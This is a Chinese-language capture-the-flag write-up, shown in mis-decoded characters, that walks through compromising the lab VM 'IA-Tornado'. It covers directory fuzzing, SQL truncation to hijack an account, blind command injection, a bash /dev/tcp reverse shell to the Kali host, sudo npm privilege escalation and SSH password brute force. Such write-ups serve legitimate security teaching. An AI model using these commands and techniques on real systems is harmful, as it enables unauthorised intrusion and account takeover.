# å‰è¨€

é¶æœºï¼š`IA-Tornado`ï¼ŒIPåœ°å€ä¸º`192.168.10.11`

æ”»å‡»ï¼š`kali`ï¼ŒIPåœ°å€ä¸º`192.168.10.2`

éƒ½é‡‡ç”¨è™šæ‹Ÿæœºï¼Œç½‘å¡ä¸ºæ¡¥æ¥æ¨¡å¼

# ä¸»æœºå‘ç°

å› ä¸ºæ˜¯ä¸‹è½½é¶æœºåˆ°æœ¬åœ°ï¼Œæ‰€ä»¥æ˜¯åŒä¸€å±€åŸŸç½‘ï¼ŒåŒä¸€ç½‘æ®µï¼ŒåŒä¸€ç½‘å¡ä¸‹ï¼Œæ‰€ä»¥ä¸ºæ±‚é€Ÿåº¦å¯ä»¥ä½¿ç”¨`arp-scan -l`æˆ–`netdiscover -r 192.168.10.1/24`

è‹¥æƒ³è¦æ¨¡æ‹ŸçœŸå®ç¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨`nmap`

![](./Tornado-pic/1.jpg)

# ä¿¡æ¯æ”¶é›†

## ä½¿ç”¨nmapæ‰«æç«¯å£

![](./Tornado-pic/2.jpg)

## ç½‘ç«™ä¿¡æ¯æ¢æµ‹

è®¿é—®80ç«¯å£é»˜è®¤ç•Œé¢ï¼Œå‘ç°æ˜¯`apachee2`çš„é»˜è®¤ç•Œé¢ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç ä¹Ÿæœªå‘ç°å†…å®¹

![](./Tornado-pic/3.jpg)

å°è¯•è¿›è¡Œç›®å½•çˆ†ç ´

ä½¿ç”¨`gobusterã€dirsearchã€dirbã€dirbusterã€ffuf`ç­‰å·¥å…·è¿›è¡Œçˆ†ç ´

```shell
gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
```

![](./Tornado-pic/4.jpg)

å‘ç°ä¸€ä¸ªè·¯å¾„`bluesky`ï¼Œå…¶ä»–è·¯å¾„æ— å¯ç”¨ï¼Œè®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œå‘ç°æ˜¯ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œä¸çŸ¥é“è¿™ç§æœ‰æ²¡æœ‰å’Œåç«¯äº¤äº’

![](./Tornado-pic/5.jpg)

å“‡ï¼Œè¿™ä¸ªç•Œé¢çœŸçš„å¾ˆåƒç°åœ¨å¤§éƒ¨åˆ†çš„ç½‘ç«™ï¼Œéƒ½æ˜¯å‰åç«¯åˆ†ç¦»çš„ï¼Œä¸è¿‡è¿™é‡Œçš„é¶åœºä¸ç¡®å®šæ˜¯å¦ä¹Ÿæ˜¯ï¼Œæ‰€ä»¥å¯¹è¿™ä¸ªè·¯å¾„å†è¿›è¡Œä¸€æ¬¡æ‰«æï¼Œå¯ä»¥çœ‹åˆ°è¿˜æ˜¯æœ‰åç«¯çš„è¯­è¨€`php`

```shell
gobuster dir -u http://192.168.10.11/bluesky -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md
```

![](./Tornado-pic/6.jpg)

æˆ–è€…å€ŸåŠ©æµè§ˆå™¨æ’ä»¶`wappalyzer`ä¹Ÿæ˜¯å¯ä»¥å‘ç°ç¼–ç¨‹è¯­è¨€çš„ï¼Œè¿™é‡Œè‹¥æ˜¯å‘ç°åï¼Œå°±å¯ä»¥å†ä½¿ç”¨ç›®å½•çˆ†ç ´äº†

![](./Tornado-pic/7.jpg)

è®¿é—®ä¸Šé¢æ‰«æå‡ºçš„è·¯å¾„ï¼Œé€šè¿‡ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå¯ç”¨çš„è·¯å¾„ä¸¤ä¸ªï¼Œä¸€ä¸ª`login.php`ä¸€ä¸ª`signup.php`

è®¿é—®`login.php`

# æ¼æ´å¯»æ‰¾

å°è¯•è¾“å…¥ä¸€äº›å¼±å¯†ç ã€ä¸‡èƒ½å¯†ç ç­‰æ“ä½œï¼Œæ— æ³•ç™»å½•æˆåŠŸ

![](./Tornado-pic/8.jpg)

å†è®¿é—®`signup.php`ï¼Œå‘ç°è¾“å…¥åï¼Œä¼šç›´æ¥æç¤ºæ³¨å†ŒæˆåŠŸä¿¡æ¯

![](./Tornado-pic/9.jpg)

ä»¥æ³¨å†Œçš„ä¿¡æ¯è¿›è¡Œè®¿é—®`login.php`ï¼Œå¹¶è¾“å…¥æ³¨å†Œçš„ä¿¡æ¯è¿›è¡Œç™»å½•

![](./Tornado-pic/10.jpg)

åœ¨ç‚¹å‡»`portfolio`æ—¶ï¼Œå‡ºç°ä¸‹é¢å­—ç¬¦ï¼Œè¯´æ˜¯`LFI`æ¼æ´è¢«ä¿®å¤äº†ï¼Œä½†æ˜¯ä¸è¦å¿˜è®°å†æµ‹è¯•

å…¶å®è¿™é‡Œç‚¹å‡»åŠŸèƒ½ç‚¹åï¼Œéƒ½æœªå‘ç°å…¶ä»–çš„åˆ©ç”¨ï¼Œä¸è¿‡è¿™é‡Œæ˜¯`php`ï¼Œæ‰€ä»¥æµ‹è¯•æ˜¯å¦æœ‰éšè—ä¼ å‚æ”¯æŒæœ¬åœ°æ–‡ä»¶åŒ…å«ç­‰ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œçˆ†ç ´

![](./Tornado-pic/11.jpg)

è¿™é‡Œå…ˆæŸ¥çœ‹æ¯ä¸ªåŠŸèƒ½ç‚¹çš„é¡µé¢æºä»£ç ï¼Œåœ¨`portfolio`è¿™é‡Œçš„é¡µé¢æºä»£ç ä¸­ï¼Œå‡ºç°æ•æ„Ÿç›®å½•ä¿¡æ¯

![](./Tornado-pic/12.jpg)

è¿™é‡Œå‡è®¾ä¸çŸ¥é“è¿™ä¸ªè·¯å¾„ï¼Œå¯¹æ¯ä¸ª`php`æ–‡ä»¶è¿›è¡Œè·¯å¾„æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨`ffuf`æˆ–`wfuzz`

ä¸è¿‡è¿™é‡Œéœ€è¦å…ˆè·å–æ­£åœ¨ç™»å½•çŠ¶æ€çš„ç”¨æˆ·çš„`cookie`æ‰è¡Œï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æµè§ˆå™¨æŸ¥çœ‹ç™»å½•çš„`cookie`

ä»¥ç«ç‹æµè§ˆå™¨ä¸ºä¾‹ï¼Œæ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå¯æŒ‰`f12`è¿›å…¥

![](./Tornado-pic/13.jpg)

æˆ–è€…åˆ©ç”¨å·¥å…·`curl`

```shell
curl -X POST -d "uname=admin&upass=admin&btn=Login" http://192.168.10.11/bluesky/login.php -c c.txt
#-Xé€‰æ‹©è¯·æ±‚æ–¹å¼ï¼Œè¿™é‡Œå¯ä»¥åœ¨æŸ¥çœ‹é¡µé¢æºä»£ç å¤„å‘ç°ï¼Œè¡¨å•æäº¤æ˜¯POST
#-d æ˜¯POSTè¯·æ±‚ä½“ä¸­çš„æ•°æ®ï¼Œè¿™é‡Œçš„æ•°æ®å½¢å¼ï¼Œå¯ä»¥å€ŸåŠ©æµè§ˆå™¨ä¸­å¼€å‘è€…å·¥å…·ï¼Œå…¶ä¸­çš„ç½‘ç»œæ¨¡å—ï¼Œå¯ä»¥å‘ç°è¯·æ±‚å½¢å¼
#-c æŠŠcookieä¿å­˜åœ¨å½“å‰ç›®å½•çš„c.txtæ–‡æ¡£ä¸­
```

æŸ¥çœ‹`c.txt`å³å¯å‘ç°`cookie`çš„åç§°ä»¥åŠå€¼

![](./Tornado-pic/14.jpg)

è¿™é‡Œè·å–åˆ°`cookie`äº†ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆç¡®å®š`cookie`æ‰å¯ä»¥å‘¢ï¼Œè¿™é‡Œä»¥`ffuf`ä¸ºä¾‹ï¼ŒæŸ¥çœ‹è¿”å›

```shell
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/port.php
#è¿™æ˜¯æœªè®¾ç½®çˆ†ç ´æ—¶çš„ï¼Œå¹¶ä¸”æœªç»™äºˆ`cookie`
```

![](./Tornado-pic/15.jpg)

ä¸Šé¢çš„è¿”å›ä¸ç›®å½•çˆ†ç ´æ—¶ä¸€æ ·ï¼Œéƒ½æ˜¯è¦`302`è·³è½¬çš„ã€‚

å†ä»¥æ·»åŠ `cookie`åçš„è¿”å›ä¸ºå¯¹æ¯”

```shell
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/port.php -H "Cookie:PHPSESSID=kmpfqldt8iqc6ps0cfklotvglv"
```

![](./Tornado-pic/16.jpg)

å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‡å®š`cookie`åï¼Œå°±å¯ä»¥ç›´æ¥è®¿é—®äº†ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä»¥`cookie`åšèº«ä»½éªŒè¯çš„

é‚£ä¹ˆå°è¯•ä½¿ç”¨`ffuf`è¿›è¡Œæµ‹è¯•ï¼Œå½“ç„¶ä½¿ç”¨`burp`æŠ“åŒ…çˆ†ç ´ï¼Œå°±é€šè¿‡æ•°æ®åŒ…ç›´æ¥çˆ†ç ´å³å¯ï¼Œå› ä¸ºè¯·æ±‚æ•°æ®åŒ…ä¸­å«æœ‰ç™»å½•çš„`cookie`ä¿¡æ¯

ä¸è¿‡è¿™é‡Œå­—å…¸è·‘äº†å¾ˆä¹…ï¼Œå¹¶æœªè·å–åˆ°ä»»ä½•ä¼ å‚ç­‰ä¿¡æ¯ï¼Œå¹¶ä¸”ç™»å½•åçš„å‡ ä¸ª`php`éƒ½æµ‹è¯•äº†

```shell
ffuf -c -w /usr/share/wordlists/dirb/common.txt:FUZZ1 -w /usr/share/wordlists/wfuzz/Injections/Traversal.txt:FUZZ2 -u http://192.168.10.11/bluesky/port.php?FUZZ1=FUZZ2 -H "Cookie:PHPSESSID=kmpfqldt8iqc6ps0cfklotvglv" -fs 2205
```



```shell
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/port.php?FUZZ=/home/tornado/imp.txt -H "Cookie:PHPSESSID=kmpfqldt8iqc6ps0cfklotvglv" -fs 2205
```

å•§ï¼Œå·²çŸ¥çš„ä¿¡æ¯å¤§æ¦‚å°±è¿™ä¹ˆå¤šï¼Œè¿™é‡Œéš¾é“ä¸æ˜¯é€šè¿‡ä¼ å‚è¿›è¡Œæ–‡ä»¶åŒ…å«çš„å—

ç»™å‡ºçš„è·¯å¾„`/home/tornado/imp.txt`

# ä¿¡æ¯æ³„éœ²

åˆ†æè¿™ä¸ªè·¯å¾„ï¼Œä¸€èˆ¬`/home`æ˜¯å­˜æ”¾ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œè€Œå…¶ç›®å½•ä¸‹çš„ä¸€èˆ¬éƒ½æ˜¯ç”¨æˆ·ï¼Œå°±å‡è®¾è¿™é‡Œçš„è·¯å¾„å°±æ˜¯å®¶ç›®å½•ã€‚è¡¨ç¤ºå­˜åœ¨ç”¨æˆ·`tornado`ã€‚é‚£ä¹ˆä¹‹å‰nmapæ‰«æçš„æ—¶å€™ï¼Œç›®æ ‡ä¸º`linux`ï¼Œæ˜¯å¦å¯ä»¥ç¡®å®šè¿™ä¸ªè·¯å¾„å…·æœ‰å¤šç§è¡¨ç°æ–¹å¼

```shell
/home/tornado/imp.txt
~/imp.txt		#è¿™é‡Œè¡¨ç¤ºå½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹çš„imp.txt
~tornado/imp.txt	#è¿™é‡Œè¡¨ç¤ºç”¨æˆ·tornadoå®¶ç›®å½•ä¸‹çš„imp.txt
#ä¸€èˆ¬  ~  ååŠ ç”¨æˆ·åï¼Œè¡¨ç¤ºæŸç”¨æˆ·çš„å®¶ç›®å½•
```

åˆ†ææ¥çœ‹ï¼Œä¸€èˆ¬ç½‘ç«™çš„ç”¨æˆ·éƒ½æ˜¯`www-data`ï¼Œå¹¶ä¸”ä¸»ç›®å½•ä¸æ˜¯åœ¨`/home`çš„ï¼Œå¹¶ä¸”è¿™é‡Œæµ‹è¯•`php`æ–‡ä»¶æœ‰æ— ä¼ å‚ï¼Œå¹¶æœªå‘ç°ï¼Œè¯´æ˜ç¡®å®ä¿®å¤äº†ï¼Œ ä¸è¿‡å‡è®¾ä¸é€šè¿‡ä¼ å‚å‘¢ï¼Œç›´æ¥é€šè¿‡ç½‘å€è¿›è¡Œè®¿é—®è¿›è¡Œæµ‹è¯•

å½“å‰çš„ç½‘å€è·¯å¾„æœ‰ä¸¤ä¸ªï¼Œå…¶ä½™å¯ä»¥ç›´æ¥çœ‹åˆ°çš„ï¼Œæ— æ„ä¹‰

```shell
http://192.168.10.11
http://192.168.10.11/bluesky
```

æŠŠè¿™ä¸¤ä¸ª`url`ä¸ä¸Šé¢ä¸‰ä¸ªè·¯å¾„è¿›è¡Œç»„åˆ

```shell
http://192.168.10.11/home/tornado/imp.txt
http://192.168.10.11/~/imp.txt
http://192.168.10.11/~tornado/imp.txt
http://192.168.10.11/bluesky/home/tornado/imp.txt
http://192.168.10.11/bluesky/~/imp.txt
http://192.168.10.11/bluesky/~tornado/imp.txt
```

ç„¶åä½¿ç”¨`ffuf`æµ‹è¯•å“ªäº›æœ‰è¿”å›

![](./Tornado-pic/17.jpg)

å‘ç°`url`ä¸­`http://192.168.10.11/~tornado/imp.txt`æœ‰è¿”å›ï¼Œè®¿é—®æŸ¥çœ‹ï¼Œå‘ç°å…¨æ˜¯é‚®ç®±åœ°å€

![](./Tornado-pic/18.jpg)

ä¹‹å‰åœ¨è¿›è¡Œç™»å½•çš„æ—¶å€™ï¼Œç”¨æˆ·åå¤„å°±æ˜¯é‚®ç®±ï¼Œæµ‹è¯•è¿™äº›ç”¨æˆ·åæ˜¯å¦å­˜åœ¨

```shell
ceo@tornado
cto@tornado
manager@tornado
hr@tornado
lfi@tornado
admin@tornado
jacob@tornado
it@tornado
sales@tornado
```

åœ¨`signup.php`è¿™é‡Œå¯ä»¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±ä¼šåƒä¹‹å‰ä¸€æ ·ï¼Œæç¤ºæ³¨å†ŒæˆåŠŸ

ä½¿ç”¨`burp`æŠ“å–æ³¨å†Œæ—¶çš„æ•°æ®åŒ…ï¼Œç„¶åè¿›è¡Œçˆ†ç ´

![](./Tornado-pic/19.jpg)

æ”»å‡»æˆåŠŸåè¿›è¡ŒæŸ¥çœ‹ï¼Œå› ä¸ºè¿™é‡Œä½¿ç”¨çš„æ˜¯`burp`ç¤¾åŒºç‰ˆï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¿›è¡Œæœç´¢ç»“æœï¼Œä¸è¿‡å¯ä»¥åœ¨è®¾ç½®ä¸­é…ç½®åŒ¹é…ï¼Œè¿™é‡Œç”¨æˆ·å·²æ³¨å†Œä¼šè¿”å›`User already registered`ï¼Œä»¥è¿™ä¸ªè¿›è¡ŒåŒ¹é…ï¼Œå°±å¯ä»¥æ¸…æ™°çš„çœ‹æ¸…äº†

![](./Tornado-pic/20.jpg)

è¿™é‡Œå»ç½‘ç«™çœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ª13æ˜¯æŒ‡é•¿åº¦ï¼Œä¸è¿‡è¿™é‡Œé•¿åº¦é™åˆ¶æ˜¯åœ¨è¡¨å•è¾“å…¥ï¼Œå’Œæˆ‘é€šè¿‡æŠ“åŒ…ä¿®æ”¹æœ‰ä»€ä¹ˆå…³ç³»ï¼Œæˆ‘å·²ç»ä¸å—è¡¨å•æ§åˆ¶äº†ï¼ŒğŸ˜„

å…¶å®ä¸»è¦æ˜¯è§‚å¯Ÿè¿™ä¸‰ä¸ªè´¦æˆ·

```shell
admin@tornado
jacob@tornado
hr@tornado
```

ä¸è¿‡å‰é¢æ—¢ç„¶æ³¨å†Œäº†ï¼Œä½¿ç”¨`burp`å†éªŒè¯ä¸€ä¸‹ï¼Œå¥‡æ€ªçš„ç‚¹å‡ºç°äº†ï¼Œå‰é¢`manager`æ³¨å†ŒæˆåŠŸçš„ï¼Œè¿™é‡Œç¡®ç™»å½•ä¸äº†

![](./Tornado-pic/21.jpg)

# åˆ†æä¸ºsqlæˆªæ–­

å‰å¾€æµè§ˆå™¨è¿›è¡Œæ‰‹å·¥æµ‹è¯•ï¼Œå‘ç°é•¿åº¦é™åˆ¶ï¼Œé‚£ä¹ˆå‰é¢æ³¨å†Œçš„æ˜¯ä»€ä¹ˆï¼Œåˆ†æä¸€ä¸‹ï¼Œåœ¨æµè§ˆå™¨è¿›è¡Œæ³¨å†Œï¼Œä¹Ÿæ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæˆ‘æ˜¯é€šè¿‡`burp`ç»•è¿‡è¿™ä¸ªå‰ç«¯çš„é•¿åº¦é™åˆ¶ã€‚

é‚£ä¹ˆï¼Œé€šè¿‡`burp`æ³¨å†Œçš„è´¦æˆ·ï¼Œåˆ°äº†æ•°æ®åº“æ€ä¹ˆå¤„ç†çš„ï¼Œæˆ–è€…è¯´æ²¡åˆ°æ•°æ®åº“çš„æ—¶å€™ç»è¿‡ä»€ä¹ˆå¤„ç†äº†ã€‚

ç›´æ¥è¾“å…¥é•¿åº¦é™åˆ¶çš„è´¦å·`manager@torna`ï¼Œå•§ï¼Œç™»å½•æˆåŠŸäº†

å¥½å®¶ä¼™ï¼Œè¯´æ˜è¿™é‡Œå‰ç«¯çš„é•¿åº¦é™åˆ¶å’Œ`sql`æ˜¯ä¸€æ ·çš„ï¼Œæˆ–è€…è¯´å‰ç«¯æ˜¯å¯ä¿®æ”¹é•¿åº¦ï¼Œ`sql`æ˜¯è¿›è¡Œæˆªæ–­æ“ä½œ

è¿™é‡Œé•¿åº¦é™åˆ¶ä¸º13ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§å½¢å¼ï¼Œæµ‹è¯•`sql`åœ¨è¿›è¡Œæˆªæ–­çš„æ—¶å€™ï¼Œæ˜¯å¦è¿˜è¿›è¡Œæ•°æ®åº“ä¸­ç”¨æˆ·çš„æ£€éªŒï¼Œè‹¥æ²¡æœ‰ï¼Œå°±å¯ä»¥å­˜åœ¨å¤šä¸ªç”¨æˆ·äº†ï¼Œå°¤å…¶æ˜¯ç©ºæ ¼ä¹‹ç±»çš„ã€‚

```
admin@tornado a
jacob@tornado a
hr@tornado    a
```

![](./Tornado-pic/22.jpg)

ä¹‹åç›´æ¥ç™»å½•`admin@tornado`ï¼Œä»¥åŠæ³¨å†Œçš„å¯†ç ï¼Œå‘ç°ç›´æ¥ç™»å½•æˆåŠŸï¼Œä½†æ˜¯æŸ¥çœ‹è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œè¿˜æ˜¯ä¸è¡Œ

![](./Tornado-pic/23.jpg)

å†æ¢ä¸€ä¸ªæ³¨å†Œ`jacob@tornado a`ï¼Œç„¶åä»¥`jacob@tornado`ç™»å½•ï¼Œå¥½å˜›ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°äº†

![](./Tornado-pic/24.jpg)

å‘ç°è¿™é‡Œè¾“å…¥ä»€ä¹ˆå°±ä¼šè¿”å›ä»€ä¹ˆï¼Œè¿™ä¸å°±æ˜¯å¾ˆå¥½çš„`xss`å—ï¼Œä½†æ˜¯è¿™é‡Œè¦`xss`è¿˜æœ‰ä»€ä¹ˆç”¨å—ï¼Œéƒ½å·²ç»ç™»å½•äº†ï¼Œå°è¯•è¯•è¯•è¾“å…¥ä¸€äº›å‘½ä»¤ï¼Œçœ‹å…¶èƒ½å¦æ‰§è¡Œ

# å‘½ä»¤æ³¨å…¥

ç»è¿‡æµ‹è¯•ï¼Œè¾“å…¥`idã€ls`ç­‰ï¼Œç›´æ¥è¿”å›è¿™äº›å­—ç¬¦ï¼Œä¸è¿‡ï¼Œæˆ‘è¿™é‡Œæµ‹è¯•ä¸€ä¸‹`ping`çš„æ—¶å€™ï¼Œå‘ç°é—®é¢˜ã€‚

æˆ‘åˆšå¼€å§‹ç›´æ¥è¾“å…¥`ping 127.0.0.1`ï¼Œå› ä¸ºæ˜¯`linux`ç•Œé¢ï¼Œæ‰€ä»¥ä¸€ç›´åœ¨åŠ è½½ï¼Œé‚£ä¹ˆï¼Œå¤§æ¦‚å°±æ¸…æ¥šäº†ã€‚ç„¶åæˆ‘æŠŠé¶æœºé‡å¯äº†ï¼Œç„¶åé‡æ–°éªŒè¯ï¼Œåªå‘é€5ä¸ªåŒ…ï¼Œ`ping -c 127.0.0.1`ï¼Œå‘ç°çœŸçš„æœ‰å˜åŒ–ï¼Œç¡®å®šæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯ä¸æŠŠå›æ˜¾è¿”å›

![](./Tornado-pic/25.jpg)

å°è¯•è¿›è¡Œ`shell`åå¼¹ï¼Œå…ˆåœ¨`kali`ä¸­ä½¿ç”¨`nc`å¼€å¯ç›‘å¬9999ç«¯å£ï¼Œç„¶åè¾“å…¥ä¸‹é¢å‘½ä»¤ï¼Œå¹¶æ‰§è¡Œ

```shell
/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'
```

![](./Tornado-pic/26.jpg)

# ææƒ

## ææƒè‡³catchmeç”¨æˆ·

ä½¿ç”¨`find`å¯»æ‰¾å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶ï¼Œå‘ç°`sudo`ï¼Œç›´æ¥å°è¯•ï¼Œå‘ç°ä¸éœ€è¦å¯†ç ï¼Œæœ‰ä¸€ä¸ªç”¨æˆ·`catchme`çš„æ–‡ä»¶å¯æ‰§è¡Œ

```shell
find / -perm -4000 -print 2>/dev/null
```

![](./Tornado-pic/27.jpg)

å¯¹äºä¸çŸ¥é“`npm`çš„`sudo`ææƒï¼Œå¯ä»¥æŸ¥çœ‹ç½‘ç«™`gtfobins.github.io`ä¸­çš„å¸®åŠ©

![](./Tornado-pic/28.jpg)

```shell
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
chmod 777 tmp.Veh2PZ0bMR
sudo -u catchme npm -C $TF --unsafe-perm i
```

![](./Tornado-pic/29.jpg)

ä½¿ç”¨`dpkg`æŸ¥çœ‹`python`ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨`python`è·å–äº¤äº’å¼ç•Œé¢

```shell
dpkg -l | grep python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](./Tornado-pic/30.jpg)

## ææƒè‡³rootç”¨æˆ·

æŸ¥çœ‹è¿™ä¸ªç”¨æˆ·çš„å®¶ç›®å½•

![](./Tornado-pic/31.jpg)

æŠŠä»£ç ä¸­å·²ç»åŠ å¯†çš„é‚£ä¸€ä¸²å°è¯•è¿›è¡Œåˆ†æï¼Œå› ä¸ºæ‰§è¡Œè¿‡è¿™ä¸ªè„šæœ¬ï¼Œå‘ç°ä¸çŸ¥é“è¾“å…¥ä»€ä¹ˆå­—ç¬¦åŠ å¯†äº†ã€‚

ä¸è¿‡è¿™é‡Œå¯ä»¥é€šè¿‡æºä»£ç ç»™è¿›è¡Œåå†™ï¼Œä¸ä¼šå†™ä»£ç å°±ç›´æ¥ä¸¢ç»™`ai`ï¼Œè¿™é‡Œå¯ä»¥æä¾›ä»£ç 

```python
import string

# å¾…è§£å¯†çš„åŠ å¯†å­—ç¬¦ä¸²
encrypted_text = "hcjqnnsotrrwnqc"

for key in string.printable:
    if len(key) > 1:
        continue
    s = "abcdefghijklmnopqrstuvwxyz"
    s = s.replace(key, '')
    s = key + s
    decrypted_text = ""
    for n in encrypted_text:
        j = ord(n)
        if j == ord(key):
            j = ord('a')
            decrypted_text += chr(j)
        elif n > 'a' and n <= key:
            j = j + 1
            decrypted_text += chr(j)
        elif n > key:
            decrypted_text += n
        elif ord(n) == 32:
            decrypted_text += chr(32)
        elif j >= 48 and j <= 57:
            decrypted_text += chr(j)
        elif j >= 33 and j <= 47:
            decrypted_text += chr(j)
        elif j >= 58 and j <= 64:
            decrypted_text += chr(j)
        elif j >= 91 and j <= 96:
            decrypted_text += chr(j)
        elif j >= 123 and j <= 126:
            decrypted_text += chr(j)
    print(decrypted_text)
```

ç„¶åæ‰§è¡Œè¿™ä¸ªè„šæœ¬ï¼ŒæŠŠç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­

![](./Tornado-pic/32.jpg)

å…¶å®æ•°æ®ä¸å¤šï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå°±å‘ç°ä¸€ä¸ªå¼•äºº`idkrootpassword`

æŠŠç»“æœè¿›è¡Œä¸€ä¸ª`ssh`çˆ†ç ´ï¼Œé’ˆå¯¹`root`ï¼Œå› ä¸ºå·²çŸ¥çš„ä¸¤ä¸ªç”¨æˆ·éƒ½ç”¨è¿‡äº†

![](./Tornado-pic/33.jpg)

æŸ¥çœ‹æœ€ç»ˆæ–‡ä»¶

![](./Tornado-pic/34.jpg)



# æ€»ç»“

è¯¥é¶æœºä¸»è¦è€ƒå¯Ÿä»¥ä¸‹å‡ ç‚¹

1. å¯¹äºç½‘ç«™è·¯å¾„ï¼Œä»¥åŠæœ¬åœ°æ–‡ä»¶åŒ…å«çš„æ³¨å…¥ç‚¹æµ‹è¯•
2. å¯¹äº`linux`ä¸­`~`è¡¨ç¤ºä»€ä¹ˆæ„æ€ï¼Œä»¥åŠ`~ç”¨æˆ·`è¡¨ç¤ºä»€ä¹ˆæ„æ€ï¼Œä»¥åŠ`/home`æ˜¯å­˜æ”¾ä»€ä¹ˆçš„
3. å¯¹äº`sql`æˆªæ–­æ³¨å…¥çš„äº†è§£ï¼Œè¦æµ‹è¯•åï¼Œæ‰èƒ½çŸ¥é“ï¼Œè¿™é‡Œå°±æ˜¯è§‚å¯Ÿåˆ°æ³¨å†ŒæˆåŠŸï¼Œä½†æ˜¯æ— æ³•æˆåŠŸç™»å½•çš„æƒ…å†µè¿›è¡Œå…·ä½“åˆ†æ
4. å¯¹äºè¾“å…¥æ¡†ï¼Œè¾“å…¥ä»€ä¹ˆè¿”å›ä»€ä¹ˆï¼Œè‹¥æ˜¯æœªç™»å½•çŠ¶æ€ï¼Œä½¿ç”¨`xss`å¯è¡Œï¼Œå½“ç„¶ï¼Œå®é™…æƒ…å†µä¸­ï¼Œè‹¥æ˜¯çœŸæœ‰ï¼Œå¯ä»¥æ„é€ é“¾æ¥ï¼Œå‘é€ç»™åˆ«äººã€‚è¿™é‡Œæ˜¯è¦è·å–`shell`ï¼Œæ‰€ä»¥æµ‹è¯•å‘½ä»¤æ³¨å…¥æ–¹é¢ã€‚è™½ç„¶æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œéœ€è¦æ—¶é—´çš„å‘½ä»¤æ—¶ï¼Œæ˜æ˜¾å‘ç°æ˜¯å¯æ‰§è¡Œå‘½ä»¤çš„
5. å¯¹äº`sudo`ææƒçš„ä¸€äº›æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯`npm`
6. å¯¹äº`python`ä»£ç ï¼Œæˆ–è€…èƒ½è·å–åˆ°å…³é”®ä¿¡æ¯ä¹Ÿè¡Œï¼Œç°åœ¨`ai`å‘å±•è¿…é€Ÿï¼Œå¯ä»¥é€šè¿‡`ai`ç›´æ¥å†™å‡ºé€†å‘è§£å¯†çš„ä»£ç 

















